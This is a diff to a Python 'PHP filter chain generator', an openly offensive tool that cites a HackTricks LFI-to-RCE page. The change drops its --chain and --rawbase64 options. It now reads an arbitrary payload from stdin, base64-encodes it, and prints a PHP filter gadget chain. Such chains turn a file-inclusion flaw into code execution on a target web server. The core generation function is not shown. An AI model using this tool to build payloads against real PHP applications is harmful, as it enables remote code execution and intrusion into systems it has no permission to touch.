@@ -2,6 +2,7 @@
 import argparse
 import base64
 import re
+import sys
 
 # - Useful infos -
 # https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
@@ -108,24 +109,13 @@ def main():
     # Parsing command line arguments
     parser = argparse.ArgumentParser(description="PHP filter chain generator.")
 
-    parser.add_argument("--chain", help="Content you want to generate. (you will maybe need to pad with spaces for your payload to work)", required=False)
-    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
-    args = parser.parse_args()
-    if args.chain is not None:
-        chain = args.chain.encode('utf-8')
-        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
+    parser.parse_args() # Display help
+    payload_contents = sys.stdin.read().encode('utf-8')
+    if len(payload_contents) > 0:
+        base64_value = base64.b64encode(payload_contents).decode('utf-8').replace("=", "")
         chain = generate_filter_chain(base64_value)
-        print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(args.chain, base64_value))
+        print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(payload_contents, base64_value))
         print(chain)
-    if args.rawbase64 is not None:
-        rawbase64 = args.rawbase64.replace("=", "")
-        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
-        if (match):
-            chain = generate_filter_chain(rawbase64, True)
-            print(chain)
-        else:
-            print ("[-] Base64 string required.")
-            exit(1)
 
 if __name__ == "__main__":
     main()
